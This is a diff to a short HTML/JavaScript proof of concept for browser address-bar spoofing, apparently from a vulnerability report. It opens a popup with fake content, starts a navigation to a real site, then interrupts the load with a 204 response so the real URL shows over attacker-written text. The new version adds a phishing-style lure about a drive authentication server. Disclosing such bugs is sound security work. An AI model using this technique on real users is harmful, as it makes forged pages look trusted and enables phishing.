@@ -1,42 +1,33 @@
-<button onclick=startAttack()>Spoof</button><br>
-After clicking button, the spoofed content will go blank in 4 seconds.<br>
-Switch to this tab and then back to the popup tab to make it appear again.<br>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+
+<button onclick=newWindow()>New Window</button>
+<button onclick=spoof()>Spoof</button>
 
 <script>
-var w;
-var t;
+let w;
+let t;
 
-function startAttack() {
-  // Open popup with fake content.
-  w = window.open();
-  w.document.write("Fake content");
-
-  // Wait for URL to change, then redirect.
-  t = setInterval('redirect()', 1);
+function newWindow() {
+  w = window.open("", "", "");
+  w.document.write(`<body onblur="document.body.innerHTML='<h2>Your address bar has been spoofed. This is not https://www.example.com</h2>'"><h2>There was a problem communicating with drive authentication server, please switch to previous tabs. Do not close this window, closing this window will cancel current download.</h2></body>`);
 }
 
-function redirect() {
-  if (w.location.href == 'about:blank')
-  	return;
+function spoof() {
+    w.location.href = 'https://www.example.com/';
 
-  alert("Switch back to opener tab before redirecting.");
+var i = setInterval(function () {
+  try {
+    w.location.href;
+  } catch (e) {
+    w.location.href = 'https://www.google.com/csi';
 
-  w.location.href = 'https://www.amazon.com/';
+    clearInterval(i);
+  }
+}, 1);
 
-  clearInterval(t);
 
-  var i = setInterval(function () {
-    try {
-      // This will throw an exception after the popup commits amazon.com.
-      var x = w.location.href;
-    } catch (e) {
-      // Interrupt the load of amazon.com with a 204 response.
-      // If this is done quickly enough, nothing will paint.
-      w.location.href = 'https://www.google.com/csi';
-
-      // We're done.  Could show an alert to force the user to switch tabs.
-      clearInterval(i);
-    }
-  }, 1);
 }
+
 </script>
